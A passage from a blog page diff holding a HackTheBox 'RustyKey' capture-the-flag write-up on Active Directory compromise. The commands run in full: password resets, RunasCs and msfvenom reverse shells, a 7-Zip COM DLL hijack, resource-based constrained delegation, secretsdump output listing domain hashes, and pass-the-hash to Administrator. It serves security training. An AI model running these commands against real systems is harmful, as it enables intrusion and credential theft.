'SUPPORT' [-] SUPPORT removed from Protected Objects copy With the protection gone, I changed ee.reed’s password:\n0xblivion@rustykey: ~ root@localhost:~# bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' -k set password 'ee.reed' '@Password123!' [+] Password changed successfully! copy WinRM didn’t work for ee.reed, so instead I used RunasCS from my bb.morgan shell to get a reverse shell as the user.\n0xblivion@rustykey: ~ *Evil-WinRM* PS .\\runas.exe ee.reed '@Password123!' powershell.exe -r 10.10.14.157:9001 copy On my listener, I got the shell: 0xblivion@rustykey: ~ root@localhost:~# rlwrap nc -lnvp 9001 listening on [any] 9001 ... connect to [10.10.14.157] from (UNKNOWN) [10.10.11.75] 54235 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Windows\\system32\u003e whoami whoami rustykey\\ee.reed PS C:\\Windows\\system32\u003e copy From this new shell, I checked for the archiving tool mentioned in the memo: C:\\Users\\0xblivion\u003e PS C:\\Windows\\system32\u003e ls \\progra~1 Directory: C:\\Program Files Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 12/26/2024 8:24 PM 7-Zip d----- 12/26/2024 4:28 PM Common Files d----- 6/24/2025 9:59 AM internet explorer d----- 12/26/2024 4:28 PM VMware d-r--- 5/30/2025 3:02 PM Windows Defender d----- 6/24/2025 9:59 AM Windows Defender Advanced Threat Protection d----- 11/5/2022 12:03 PM Windows Mail d----- 6/5/2025 7:54 AM Windows Media Player d----- 9/15/2018 12:19 AM Windows Multimedia Platform d----- 9/15/2018 12:28 AM windows nt d----- 11/5/2022 12:03 PM Windows Photo Viewer d----- 9/15/2018 12:19 AM Windows Portable Devices d----- 9/15/2018 12:19 AM Windows Security d----- 9/15/2018 12:19 AM WindowsPowerShell It’s 7-Zip. Now to find the COM hijacking vulnerability. I searched online for 7-Zip’s CLSID and found it was likely {23170F69-40C1-278A-1000-000100020000}.\nI verified this with a registry query:\nC:\\Users\\0xblivion\u003e PS C:\\Windows\\system32\u003e reg query \"HKCR\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\" /s reg query \"HKCR\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\" /s HKEY_CLASSES_ROOT\\CLSID\\{23170F69-40C1-278A-1000-000100020000} (Default) REG_SZ 7-Zip Shell Extension HKEY_CLASSES_ROOT\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\\InprocServer32 (Default) REG_SZ C:\\Program Files\\7-Zip\\7-zip.dll ThreadingModel REG_SZ Apartment The InprocServer32 key points to the legitimate DLL. The “extended access” from the memo gave me the permissions needed to modify this key.\nFirst, I generated a malicious DLL with msfvenom: 0xblivion@rustykey: ~ root@localhost:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.157 LPORT=9002 -f dll -o 7shit.dll Warning: KRB5CCNAME environment variable not supported - unsetting [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 510 bytes Final size of dll file: 9216 bytes Saved as: 7shit.dll copy I then upload this 7shit.dll to C:\\ProgramData using WinRM session from bb.morgan. Then setup a listener on metasploit with the same payload:\n0xblivion@rustykey: ~ root@localhost:~# msfconsole -q -x 'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 9002; run' [*] Using configured payload generic/shell_reverse_tcp payload =\u003e windows/x64/meterpreter/reverse_tcp LHOST =\u003e tun0 LPORT =\u003e 9002 [*] Started reverse TCP handler on 10.10.14.157:9002 copy I uploaded this DLL to C:\\ProgramData\\ and set up a Metasploit listener. Finally, from my ee.reed shell, I modified the registry to point to my malicious DLL:\nC:\\Users\\0xblivion\u003e PS C:\\Windows\u003e cmd.exe /c 'reg add \"HKLM\\Software\\Classes\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\\InprocServer32\" /v \"\" /t REG_SZ /d \"C:\\ProgramData\\7shit.dll\" /f' The operation completed successfully. A few moments later, my Metasploit listener caught a shell from mm.turner: 0xblivion@rustykey: ~ [*] Started reverse TCP handler on 10.10.14.157:9002 [*] Meterpreter session 1 opened (10.10.14.157:9002 -\u003e 10.10.11.75:...) meterpreter \u003e getuid Server username: RUSTYKEY\\mm.turner copy Success! I escalated my privileges to mm.turner.\nDomain Dominance (TA0004) Resource-Based Constrained Delegation (T1558.003) Remember from the BloodHound analysis, mm.turner is in the DelegationManager group. This means I can allow a principal I control (the IT-Computer3$ machine account) to impersonate other users to the DC.\nFrom my Meterpreter shell, I used PowerShell to modify the DC’s msDS-AllowedToActOnBehalfOfOtherIdentity attribute, granting delegation rights to IT-Computer3$.\n0xblivion@rustykey: ~ meterpreter \u003e shell Process 3592 created. Channel 1 created. Microsoft Windows [Version 10.0.17763.7434] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\u003epowershell powershell Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Windows\u003e Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$ PS C:\\Windows\u003e copy With the RBCD rule in place, I used getST.py to get a service ticket for backupadmin (since administrator is a protected user).\n0xblivion@rustykey: ~ root@localhost:~# getST.py -dc-ip $target -impersonate administrator -k -spn cifs/DC.rustykey.htb 'rustykey.htb/IT-COMPUTER3$':'Rusty88!' Impacket v0.13.0.dev0+20250327.181549.7078e935 - Copyright Fortra, LLC and its affiliated companies [*] Impersonating administrator [*] Requesting S4U2self [*] Requesting S4U2Proxy [-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option) [-] Probably SPN is not allowed to delegate by user IT-COMPUTER3$ or initial TGT not forwardable root@localhost:~# getST.py -dc-ip $target -impersonate backupadmin -k -spn cifs/DC.rustykey.htb 'rustykey.htb/IT-COMPUTER3$':'Rusty88!' Impacket v0.13.0.dev0+20250327.181549.7078e935 - Copyright Fortra, LLC and its affiliated companies [*] Impersonating backupadmin [*] Requesting S4U2self [*] Requesting S4U2Proxy [*] Saving ticket in backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache copy Dumping Credentials (T1003.003) This gave me a service ticket for backupadmin. I exported this ticket and used it with secretsdump.py to dump all the domain hashes from the NTDS.dit file.\n0xblivion@rustykey: ~ root@localhost:~# secretsdump.py -k -no-pass rustykey.htb/backupadmin@dc.rustykey.htb Impacket v0.13.0.dev0+20250327.181549.7078e935 - Copyright Fortra, LLC and its affiliated companies [*] Service RemoteRegistry is in stopped state [*] Starting service RemoteRegistry [*] Target system bootKey: 0x94660760272ba2c07b13992b57b432d4 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3aac437da6f5ae94b01a6e5347dd920::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: [*] Dumping cached domain logon information (domain/username:hash) [*] Dumping LSA Secrets [*] $MACHINE.ACC RUSTYKEY\\DC$:plain_password_hex:0c7fbe96b20b5afd1da58a1d71a2dbd6ac75b42a93de3c18e4b7d448316ca40c74268fb0d2281f46aef4eba9cd553bbef21896b316407ae45ef212b185b299536547a7bd796da250124a6bb3064ae48ad3a3a74bc5f4d8fbfb77503eea0025b3194af0e290b16c0b52ca4fecbf9cfae6a60b24a4433c16b9b6786a9d212c7aaefefa417fe33cc7f4dcbe354af5ce95f407220bada9b4d841a3aa7c6231de9a9ca46a0621040dc384043e19800093303e1485021289d8719dd426d164e90ee3db3914e3d378cc9e80560f20dcb64b488aa468c1b71c2bac3addb4a4d55231d667ca4ba2ad36640985d9b18128f7755b25 RUSTYKEY\\DC$:aad3b435b51404eeaad3b435b51404ee:b266231227e43be890e63468ab168790::: [*] DefaultPassword RUSTYKEY\\Administrator:Rustyrc4key#! [*] DPAPI_SYSTEM dpapi_machinekey:0x3c06efaf194382750e12c00cd141d275522d8397 dpapi_userkey:0xb833c05f4c4824a112f04f2761df11fefc578f5c [*] NL$KM 0000 6A 34 14 2E FC 1A C2 54 64 E3 4C F1 A7 13 5F 34 j4.....Td.L..._4 0010 79 98 16 81 90 47 A1 F0 8B FC 47 78 8C 7B 76 B6 y....G....Gx.{v. 0020 C0 E4 94 9D 1E 15 A6 A9 70 2C 13 66 D7 23 A1 0B ........p,.f.#.. 0030 F1 11 79 34 C1 8F 00 15 7B DF 6F C7 C3 B4 FC FE ..y4....{.o..... NL$KM:6a34142efc1ac25464e34cf1a7135f34799816819047a1f08bfc47788c7b76b6c0e4949d1e15a6a9702c1366d723a10bf1117934c18f00157bdf6fc7c3b4fcfe [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:f7a351e12f70cc177a1d5bd11b28ac26::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f4ad30fa8d8f2cfa198edd4301e5b0f3::: rustykey.htb\\rr.parker:1137:aad3b435b51404eeaad3b435b51404ee:d0c72d839ef72c7d7a2dae53f7948787::: rustykey.htb\\mm.turner:1138:aad3b435b51404eeaad3b435b51404ee:7a35add369462886f2b1f380ccec8bca::: rustykey.htb\\bb.morgan:1139:aad3b435b51404eeaad3b435b51404ee:44c72edbf1d64dc2ec4d6d8bc24160fc::: rustykey.htb\\gg.anderson:1140:aad3b435b51404eeaad3b435b51404ee:93290d859744f8d07db06d5c7d1d4e41::: rustykey.htb\\dd.ali:1143:aad3b435b51404eeaad3b435b51404ee:20e03a55dcf0947c174241c0074e972e::: rustykey.htb\\ee.reed:1145:aad3b435b51404eeaad3b435b51404ee:4dee0d4ff7717c630559e3c3c3025bbf::: rustykey.htb\\nn.marcos:1146:aad3b435b51404eeaad3b435b51404ee:33aa36a7ec02db5f2ec5917ee544c3fa::: rustykey.htb\\backupadmin:3601:aad3b435b51404eeaad3b435b51404ee:34ed39bc39d86932b1576f23e66e3451::: DC$:1000:aad3b435b51404eeaad3b435b51404ee:b266231227e43be890e63468ab168790::: Support-Computer1$:1103:aad3b435b51404eeaad3b435b51404ee:5014a29553f70626eb1d1d3bff3b79e2::: Support-Computer2$:1104:aad3b435b51404eeaad3b435b51404ee:613ce90991aaeb5187ea198c629bbf32::: Support-Computer3$:1105:aad3b435b51404eeaad3b435b51404ee:43c00d56ff9545109c016bbfcbd32bee::: Support-Computer4$:1106:aad3b435b51404eeaad3b435b51404ee:c52b0a68cb4e24e088164e2e5cf2b98a::: Support-Computer5$:1107:aad3b435b51404eeaad3b435b51404ee:2f312c564ecde3769f981c5d5b32790a::: Finance-Computer1$:1118:aad3b435b51404eeaad3b435b51404ee:d6a32714fa6c8b5e3ec89d4002adb495::: Finance-Computer2$:1119:aad3b435b51404eeaad3b435b51404ee:49c0d9e13319c1cb199bc274ee14b04c::: Finance-Computer3$:1120:aad3b435b51404eeaad3b435b51404ee:65f129254bea10ac4be71e453f6cabca::: Finance-Computer4$:1121:aad3b435b51404eeaad3b435b51404ee:ace1db31d6aeb97059bf3efb410df72f::: Finance-Computer5$:1122:aad3b435b51404eeaad3b435b51404ee:b53f4333805f80406b4513e60ef83457::: IT-Computer1$:1123:aad3b435b51404eeaad3b435b51404ee:fe60afe8d9826130f0e06cd2958a8a61::: IT-Computer2$:1124:aad3b435b51404eeaad3b435b51404ee:73d844e19c8df244c812d4be1ebcff80::: IT-Computer3$:1125:aad3b435b51404eeaad3b435b51404ee:b52b582f02f8c0cd6320cd5eab36d9c6::: IT-Computer4$:1126:aad3b435b51404eeaad3b435b51404ee:763f9ea340ccd5571c1ffabf88cac686::: IT-Computer5$:1127:aad3b435b51404eeaad3b435b51404ee:1679431d1c52638688b4f1321da14045::: [*] Kerberos keys grabbed Administrator:des-cbc-md5:e007705d897310cd krbtgt:aes256-cts-hmac-sha1-96:ee3271eb3f7047d423c8eeaf1bd84f4593f1f03ac999a3d7f3490921953d542a krbtgt:aes128-cts-hmac-sha1-96:24465a36c2086d6d85df701553a428af krbtgt:des-cbc-md5:d6d062fd1fd32a64 rustykey.htb\\rr.parker:des-cbc-md5:8c5b3b54b9688aa1 rustykey.htb\\mm.turner:aes256-cts-hmac-sha1-96:707ba49ed61c6575bfe9a3fd1541fc008e8803bfb0d7b5d21122cc464f39cbb9 rustykey.htb\\mm.turner:aes128-cts-hmac-sha1-96:a252d2716a0b365649eaec02f84f12c8 rustykey.htb\\mm.turner:des-cbc-md5:a46ea77c13854945 rustykey.htb\\bb.morgan:des-cbc-md5:d6ef5e57a2abb93b rustykey.htb\\gg.anderson:des-cbc-md5:8923850da84f2c0d rustykey.htb\\dd.ali:des-cbc-md5:613da45e3bef34a7 rustykey.htb\\ee.reed:des-cbc-md5:2fc46d9b898a4a29 rustykey.htb\\nn.marcos:aes256-cts-hmac-sha1-96:53ee5251000622bf04e80b5a85a429107f8284d9fe1ff5560a20ec8626310ee8 rustykey.htb\\nn.marcos:aes128-cts-hmac-sha1-96:cf00314169cb7fea67cfe8e0f7925a43 rustykey.htb\\nn.marcos:des-cbc-md5:e358835b1c238661 rustykey.htb\\backupadmin:des-cbc-md5:625e25fe70a77358 DC$:des-cbc-md5:915d9d52a762675d Support-Computer1$:aes256-cts-hmac-sha1-96:89a52d7918588ddbdae5c4f053bbc180a41ed703a30c15c5d85d123457eba5fc Support-Computer1$:aes128-cts-hmac-sha1-96:3a6188fdb03682184ff0d792a81dd203 Support-Computer1$:des-cbc-md5:c7cb8a76c76dfed9 Support-Computer2$:aes256-cts-hmac-sha1-96:50f8a3378f1d75df813db9d37099361a92e2f2fb8fcc0fc231fdd2856a005828 Support-Computer2$:aes128-cts-hmac-sha1-96:5c3fa5c32427fc819b10f9b9ea4be616 Support-Computer2$:des-cbc-md5:a2a202ec91e50b6d Support-Computer3$:aes256-cts-hmac-sha1-96:e3b7b8876ac617dc7d2ba6cd2bea8de74db7acab2897525dfd284c43c8427954 Support-Computer3$:aes128-cts-hmac-sha1-96:1ea036e381f3279293489c19cfdeb6c1 Support-Computer3$:des-cbc-md5:c13edcfe4676f86d Support-Computer4$:aes256-cts-hmac-sha1-96:1708c6a424ed59dedc60e980c8f2ab88f6e2bb1bfe92ec6971c8cf5a40e22c1e Support-Computer4$:aes128-cts-hmac-sha1-96:9b6d33ef93c69721631b487dc00d3047 Support-Computer4$:des-cbc-md5:3b79647680e0d57a Support-Computer5$:aes256-cts-hmac-sha1-96:464551486df4086accee00d3d37b60de581ee7adad2a6a31e3730fad3dfaed42 Support-Computer5$:aes128-cts-hmac-sha1-96:1ec0c93b7f9df69ff470e2e05ff4ba89 Support-Computer5$:des-cbc-md5:73abb53162d51fb3 Finance-Computer1$:aes256-cts-hmac-sha1-96:a57ce3a3e4ee34bc08c8538789fa6f99f5e8fb200a5f77741c5bf61b3d899918 Finance-Computer1$:aes128-cts-hmac-sha1-96:e62b7b772aba6668af65e9d1422e6aea Finance-Computer1$:des-cbc-md5:d9914cf29e76f8df Finance-Computer2$:aes256-cts-hmac-sha1-96:4d45b576dbd0eab6f4cc9dc75ff72bffe7fae7a2f9dc50b5418e71e8dc710703 Finance-Computer2$:aes128-cts-hmac-sha1-96:3fd0dd200120ca90b43af4ab4e344a78 Finance-Computer2$:des-cbc-md5:23ef512fb3a8d37c Finance-Computer3$:aes256-cts-hmac-sha1-96:1b2280d711765eb64bdb5ab1f6b7a3134bc334a3661b3335f78dd590dee18b0d Finance-Computer3$:aes128-cts-hmac-sha1-96:a25859c88f388ae7134b54ead8df7466 Finance-Computer3$:des-cbc-md5:2a688a43ab40ecba Finance-Computer4$:aes256-cts-hmac-sha1-96:291adb0905f3e242748edd1c0ecaab34ca54675594b29356b90da62cf417496f Finance-Computer4$:aes128-cts-hmac-sha1-96:81fed1f0eeada2f995ce05bbf7f8f951 Finance-Computer4$:des-cbc-md5:6b7532c83bc84c49 Finance-Computer5$:aes256-cts-hmac-sha1-96:6171c0240ae0ce313ecbd8ba946860c67903b12b77953e0ee38005744507e3de Finance-Computer5$:aes128-cts-hmac-sha1-96:8e6aa26b24cdda2d7b5474b9a3dc94dc Finance-Computer5$:des-cbc-md5:92a72f7f865bb6cd IT-Computer1$:aes256-cts-hmac-sha1-96:61028ace6c840a6394517382823d6485583723f9c1f98097727ad3549d833b1e IT-Computer1$:aes128-cts-hmac-sha1-96:7d1a98937cb221fee8fcf22f1a16b676 IT-Computer1$:des-cbc-md5:019d29370ece8002 IT-Computer2$:aes256-cts-hmac-sha1-96:e9472fb1cf77df86327e5775223cf3d152e97eebd569669a6b22280316cf86fa IT-Computer2$:aes128-cts-hmac-sha1-96:a80fba15d78f66477f0591410a4ffda7 IT-Computer2$:des-cbc-md5:622f2ae961abe932 IT-Computer3$:aes256-cts-hmac-sha1-96:7871b89896813d9e4a732a35706fe44f26650c3da47e8db4f18b21cfbb7fbecb IT-Computer3$:aes128-cts-hmac-sha1-96:0e14a9e6fd52ab14e36703c1a4c542e3 IT-Computer3$:des-cbc-md5:f7025180cd23e5f1 IT-Computer4$:aes256-cts-hmac-sha1-96:68f2e30ca6b60ec1ab75fab763087b8772485ee19a59996a27af41a498c57bbc IT-Computer4$:aes128-cts-hmac-sha1-96:181ffb2653f2dc5974f2de924f0ac24a IT-Computer4$:des-cbc-md5:bf58cb437340cd3d IT-Computer5$:aes256-cts-hmac-sha1-96:417a87cdc95cb77997de6cdf07d8c9340626c7f1fbd6efabed86607e4cfd21b8 IT-Computer5$:aes128-cts-hmac-sha1-96:873fd89f24e79dcd0affe6f63c51ec9a IT-Computer5$:des-cbc-md5:ad5eec6bcd4f86f7 copy Final Shell as SYSTEM (T1078) With the Administrator’s NTLM hash (f7a351e12f70cc177a1d5bd11b28ac26), I can perform a pass-the-hash attack to get a Kerberos Ticket Granting Ticket (TGT).\nFirst, I use getTGT.py with the hash: 0xblivion@rustykey: ~ root@localhost:~# getTGT.py rustykey.htb/administrator -no-pass -hashes :f7a351e12f70cc177a1d5bd11b28ac26 Impacket v0.13.0.dev0+20250327.181549.7078e935 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in administrator.ccache copy Now, with the ticket saved, I can use it with evil-winrm to perform a pass-the-ticket attack and get a shell as SYSTEM.\n0xblivion@rustykey: ~ root@localhost:~# KRB5CCNAME=administrator.ccache evil-winrm -i dc.rustykey.htb -r rustykey.htb Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS PS C:\\Users\\Administrator\\Documents\u003e type ..\\Desktop\\root.txt 160005dfd79468f459596ebccca4dbb5 copy Root flag: 160005dfd79468f459596ebccca4dbb5 ",
+  "wordCount" : "3877",
+  "inLanguage": "en",
+  "image": "https://0xblivion.dev/img/favicon.png","datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "0xblivion"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/posts/htb/windows/hard/hackthebox---rustykey-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "0xblivion.dev",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="0xblivion.dev (Alt + H)">0xblivion.dev</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      
+    </h1>
+    <div class="post-meta">19 min&nbsp;·&nbsp;0xblivion
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#hackthebox-rustykey-writeup" aria-label="HackTheBox: RustyKey Writeup">HackTheBox: RustyKey Writeup</a></li>
+                <li>
+                    <a href="#initial-access-ta0001" aria-label="Initial Access (TA0001)">Initial Access (TA0001)</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#reconnaissance-ta0043" aria-label="Reconnaissance (TA0043)">Reconnaissance (TA0043)</a></li>
+                <li>
+                    <a href="#time-synchronization-for-kerberos" aria-label="Time Synchronization for Kerberos">Time Synchronization for Kerberos</a></li>
+                <li>
+                    <a href="#active-directory-discovery-ta0007" aria-label="Active Directory Discovery (TA0007)">Active Directory Discovery (TA0007)</a></li></ul>
+                    </ul>
+                </li>
+                <li>
+                    <a href="#credential-access-ta0006" aria-label="Credential Access (TA0006)">Credential Access (TA0006)</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#timeroasting-t1558004" aria-label="Timeroasting (T1558.004)">Timeroasting (T1558.004)</a></li>
+                <li>
+                    <a href="#password-spraying-t1110003" aria-label="Password Spraying (T1110.003)">Password Spraying (T1110.003)</a></li></ul>
+                    </ul>
+                </li>
+                <li>
+                    <a href="#privilege-escalation--lateral-movement-ta0004-ta0008" aria-label="Privilege Escalation &amp; Lateral Movement (TA0004, TA0008)">Privilege Escalation &amp; Lateral Movement (TA0004, TA0008)</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#bloodhound-analysis-t1069" aria-label="BloodHound Analysis (T1069)">BloodHound Analysis (T1069)</a></li>
+                <li>
+                    <a href="#gaining-user-access-via-password-reset-t1098" aria-label="Gaining User Access via Password Reset (T1098)">Gaining User Access via Password Reset (T1098)</a></li></ul>
+                    </ul>
+                </li>
+                <li>
+                    <a href="#com-hijacking-for-privilege-escalation-t1546015" aria-label="COM Hijacking for Privilege Escalation (T1546.015)">COM Hijacking for Privilege Escalation (T1546.015)</a></li>
+                <li>
+                    <a href="#domain-dominance-ta0004" aria-label="Domain Dominance (TA0004)">Domain Dominance (TA0004)</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#resource-based-constrained-delegation-t1558003" aria-label="Resource-Based Constrained Delegation (T1558.003)">Resource-Based Constrained Delegation (T1558.003)</a></li>
+                <li>
+                    <a href="#dumping-credentials-t1003003" aria-label="Dumping Credentials (T1003.003)">Dumping Credentials (T1003.003)</a></li>
+                <li>
+                    <a href="#final-shell-as-system-t1078" aria-label="Final Shell as SYSTEM (T1078)">Final Shell as SYSTEM (T1078)</a>
+                </li>
+            </ul>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="hackthebox-rustykey-writeup">HackTheBox: RustyKey Writeup<a hidden class="anchor" aria-hidden="true" href="#hackthebox-rustykey-writeup">#</a></h1>
+<p>RustyKey is a Hard Windows box on HackTheBox. The path starts with a given set of user credentials. From there, we use BloodHound to map out an attack path, which leads to a Timeroasting attack. This attack gives us the NTLM hash for a machine account, which we can crack.</p>
+<p>With the cracked password for the <code>IT-Computer3$</code> machine account, we have the ability to add ourselves to the <code>HelpDesk</code> group. This allows us to pivot and eventually perform a COM DLL hijacking attack to gain access as the user <code>mm.turner</code>. As this user, we can configure Resource-Based Constrained Delegation (RBCD) against the domain controller. This lets us impersonate a privileged user, dump all the domain hashes with <code>secretsdump</code>, and finally grab the root flag.</p>
+
+<div class="target-info">
+    <div class="target-icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <circle cx="12" cy="12" r="10"/>
+            <circle cx="12" cy="12" r="6"/>
+            <circle cx="12" cy="12" r="2"/>
+        </svg>
+    </div>
+    <div class="target-details">
+        <div class="target-item">
+            <span class="target-label">Target IP</span>
+            <code class="ip-address">10.10.22.233</code>
+        </div>
+        
+        <div class="creds-separator">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/>
+            </svg>
+        </div>
+        <div class="target-item">
+            <span class="target-label">Initial Credentials</span>
+            <code class="credentials">rr.parker:8#t5HE8L!W3A</code>
+        </div>
+        
+    </div>
+</div>
+
+<style>
+.target-info {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 12px 16px;
+    margin: 16px 0;
+    background: linear-gradient(135deg, #0d1117 0%, #161b22 100%);
+    border-left: 4px solid #9fef00;
+    border-radius: 8px;
+    font-family: system-ui, -apple-system, sans-serif;
+}
+
+.target-icon {
+    flex-shrink: 0;
+}
+
+.target-icon svg {
+    width: 20px;
+    height: 20px;
+    color: #9fef00;
+    display: block;
+}
+
+.target-details {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+}
+
+.target-item {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+}
+
+.creds-separator {
+    flex-shrink: 0;
+    opacity: 1;
+}
+
+.creds-separator svg {
+    width: 18px;
+    height: 18px;
+    color: #9fef00;
+    display: block;
+    stroke-width: 2.5;
+}
+
+.target-label {
+    font-size: 14px;
+    font-weight: 600;
+    color: #c9d1d9;
+    white-space: nowrap;
+}
+
+.ip-address, .credentials {
+    color: #9fef00;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    font-weight: bold;
+    background: none !important;
+    background-color: transparent !important;
+    padding: 0 !important;
+    border: none !important;
+    border-radius: 0 !important;
+}
+</style>
+
+
+
+
+
+<div id="flowchart-1752164523374826374" class="attack-path-flowchart">
+  <div class="flowchart-controls">
+    <button class="zoom-btn" data-action="zoom-in" title="Zoom In">+</button>
+    <button class="zoom-btn" data-action="zoom-out" title="Zoom Out">−</button>
+    <button class="zoom-btn" data-action="reset" title="Reset View">⌂</button>
+  </div>
+  <div class="flowchart-data" style="display: none;">
+[https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Timeroasting → Crack IT-Computer3$  
+[https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Password Spray → Identify Valid IT-Computer3$  
+[https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Add IT-Computer3$ to HELPDESK  
+[https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Reset bb.morgan Password → Evil-WinRM Access  
+[https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Download internal.pdf → Find COM Hijack Lead  
+[https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Reset ee.reed Password → Runas Reverse Shell  
+[https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Exploit 7-Zip COM Hijack → Meterpreter as mm.turner  
+[https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]RBCD → Impersonate backupadmin → Dump Hashes  
+[https://i.ibb.co/679DN5x7/rooted-removebg-preview.png]Use TGT (Pass-the-Ticket) → SYSTEM  
+</div>
+</div>
+
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" xintegrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
